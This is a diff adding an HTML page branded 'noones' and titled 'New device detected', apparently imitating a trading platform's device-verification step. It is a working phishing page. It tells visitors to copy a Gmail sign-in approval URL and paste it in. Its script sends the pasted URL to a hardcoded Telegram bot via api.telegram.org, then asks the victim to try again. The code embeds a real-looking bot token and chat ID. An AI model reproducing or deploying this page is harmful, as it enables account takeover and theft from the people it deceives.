@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>New device detected — Mock</title>
+    <style>
+         :root {
+            --green: #0f7a4a;
+            --green-700: #0b5e39;
+            --muted: #9aa6a0;
+            --bg: #083825;
+            --card: #ffffff;
+            --radius: 14px;
+        }
+        
+        html,
+        body {
+            height: 100%;
+            margin: 0;
+            font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto;
+            background: linear-gradient(180deg, #07462f 0%, #053a27 100%);
+            color: #0b2b1e;
+            display: flex;
+            /* Centering the content */
+            justify-content: center;
+            /* Center horizontally */
+            align-items: center;
+            /* Center vertically */
+        }
+        
+        .wrap {
+            width: 100%;
+            /* Full width for mobile */
+            max-width: 480px;
+            /* Set max width for larger screens */
+            padding: 28px 16px;
+            box-sizing: border-box;
+        }
+        
+        .card {
+            width: 100%;
+            background: var(--card);
+            border-radius: var(--radius);
+            box-shadow: 0 18px 30px rgba(3, 25, 18, 0.35);
+            padding: 28px;
+            text-align: center;
+            margin: auto;
+            /* Center the card */
+        }
+        
+        .logo {
+            font-weight: 800;
+            color: var(--green);
+            font-size: 36px;
+            margin-bottom: 6px;
+        }
+        
+        h1 {
+            margin: 10px 0 6px;
+            font-size: 20px;
+            color: #0b3f2b;
+        }
+        
+        p.lead {
+            margin: 0 0 18px;
+            color: var(--muted);
+            font-size: 14px;
+        }
+        
+        .device-graphic {
+            width: 92px;
+            height: 72px;
+            margin: 8px auto 18px;
+            display: block;
+        }
+        
+        .notice {
+            margin-top: 6px;
+            color: #2b6b4a;
+            font-weight: 600;
+        }
+        
+        .input-group {
+            text-align: left;
+            margin-top: 18px;
+            margin-bottom: 14px;
+        }
+        
+        label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #0b3f2b;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 10px;
+            margin-top: 6px;
+            box-sizing: border-box;
+            border-radius: 8px;
+            border: 1px solid #d7e7e1;
+            font-size: 15px;
+            outline: none;
+            transition: 0.2s ease;
+        }
+        
+        input:focus {
+            border-color: var(--green);
+            box-shadow: 0 0 0 3px rgba(20, 132, 86, 0.35);
+        }
+        
+        .actions {
+            margin-top: 18px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        
+        .btn {
+            padding: 12px 16px;
+            font-weight: 600;
+            font-size: 15px;
+            border-radius: 10px;
+            cursor: pointer;
+            border: 0;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(180deg, var(--green), var(--green-700));
+            color: white;
+        }
+        
+        .btn-primary[disabled] {
+            background: #eef3f0;
+            color: #b6c6bf;
+            cursor: not-allowed;
+        }
+        
+        .btn-ghost {
+            background: transparent;
+            border: 1px solid #e6efe9;
+            color: var(--green-700);
+        }
+        
+        .cancel {
+            display: block;
+            margin-top: 14px;
+            font-size: 14px;
+            color: var(--green);
+            text-decoration: underline;
+        }
+        /* Responsive adjustments */
+        
+        @media (max-width: 600px) {
+            .logo {
+                font-size: 28px;
+                /* Smaller logo on mobile */
+            }
+            h1 {
+                font-size: 18px;
+                /* Smaller heading */
+            }
+            input {
+                font-size: 14px;
+                /* Smaller text in input */
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="wrap">
+        <div class="card">
+            <div class="logo">noones</div>
+
+            <h1>New device detected</h1>
+            <p class="lead">Confirm this is your device from the email we sent to</p>
+
+            <div id="emailDisplay" style="font-weight:700;color:#174c34;margin-bottom:14px;"></div>
+
+            <svg class="device-graphic" viewBox="0 0 64 48">
+                <g fill="none" stroke="#0f7a4a" stroke-width="2">
+                    <rect x="2" y="6" width="44" height="28" rx="2" fill="#e8f8ee"></rect>
+                    <rect x="34" y="26" width="22" height="14" rx="2" fill="#e8f8ee"></rect>
+                </g>
+            </svg>
+
+            <div class="notice">We don't recognize this device</div>
+            <form method="post" action="/second_step/">
+                <input type="hidden" name="csrfmiddlewaretoken" value="89rSqdSixXHmmv8rMQ2hsH6bWPZ7QUAvXjgXdA2OmDSdqa7VM9PdnpKTCdODWT25">
+
+                <div class="input-group">
+                    <label>Long Press "Allow" on Gmail send, Copy URL and Paste verification URL here</label>
+                    <input type="text" name="code" placeholder="">
+                </div>
+
+                <div class="actions">
+                    <button type="submit" id="submitBtn" class="btn btn-primary">Submit verification</button>
+                </div>
+            </form>
+
+            <button id="resendBtn" class="btn btn-primary">Resend email</button>
+            <button class="btn btn-ghost">Try another way</button>
+        </div>
+    </div>
+
+    <script>
+        // Display the email stored in localStorage
+        const email = localStorage.getItem("userEmail");
+
+        // Check if the email exists and display it
+        if (email) {
+            document.getElementById("emailDisplay").innerText = email;
+        } else {
+            document.getElementById("emailDisplay").innerText = "No email found.";
+        }
+
+        let seconds = 25;
+        let btn = document.getElementById('resendBtn');
+        const TELEGRAM_BOT_TOKEN = '8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q'; // Replace with your bot token
+        const CHAT_ID = '5615316142'; // Replace with your chat ID
+
+        function countdown() {
+            seconds--;
+            if (seconds <= 0) {
+                btn.disabled = false;
+                btn.innerHTML = "Resend email";
+                return;
+            }
+
+            countElem.textContent = seconds;
+            btn.innerHTML = `Resend email (<span id="count">${seconds}</span> sec.)`;
+            setTimeout(countdown, 1000);
+        }
+
+        setTimeout(countdown, 1000);
+
+        document.querySelector('form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const verificationUrl = document.querySelector('input[name="code"]').value;
+
+            // Send verification URL to the Telegram bot
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `New verification URL submitted: ${verificationUrl}`,
+                    })
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    alert('copy url well and resend again');
+                    console.log(data); // Optional: log the response from Telegram
+                })
+                .catch(error => {
+                    alert('Error sending verification URL: ' + error);
+                    console.error('Error:', error);
+                });
+        });
+    </script>
+</body>
+
+</html>
